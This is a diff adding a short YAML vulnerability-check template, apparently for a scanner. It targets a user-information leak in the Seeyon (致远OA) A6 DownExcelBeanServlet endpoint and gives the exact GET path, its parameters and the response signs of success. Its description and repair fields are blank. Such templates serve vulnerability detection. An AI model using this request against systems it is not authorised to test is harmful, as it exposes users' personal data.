@@ -1,0 +1,20 @@
+id:
+
+info:
+  name: 致远OA A6 DownExcelBeanServlet接口用户信息泄漏漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
+  headers:
+  data:
+response1:
+  headers:
+    Content-disposition: attachment;filename
+  body:
+  code: 200
+requests2:
+response2:
